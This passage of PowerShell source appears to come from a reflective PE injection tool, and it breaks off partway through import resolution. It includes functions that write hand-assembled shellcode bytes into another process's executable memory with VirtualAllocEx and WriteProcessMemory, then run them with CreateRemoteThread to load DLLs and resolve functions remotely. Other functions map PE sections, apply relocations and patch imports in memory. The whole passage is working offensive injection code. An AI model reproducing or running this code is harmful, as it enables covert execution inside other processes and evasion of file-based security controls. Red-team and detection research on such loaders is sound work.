        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types

        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }

        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }


    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }


            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem

            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)


            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            write-output "sleeping"

            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $DllAddress
    }


    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,

        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)

        #Write FunctionName to memory (will be used in GetProcAddress)
        $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RFuncNamePtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($FunctionNameSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes


        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }


        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        #todo: need to have detection for when to get by ordinal
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem

        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }

        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)

            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }

            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }

            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }

            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }

        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }

                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $ProcedureName = ''
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([Int64]$OriginalThunkRefVal -lt 0)
                    {
                        $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                    }

                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
                    }
                    else
                    {
                        if($ProcedureName -is [string])
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
                        }
                        else
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
                        }
                    }

                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

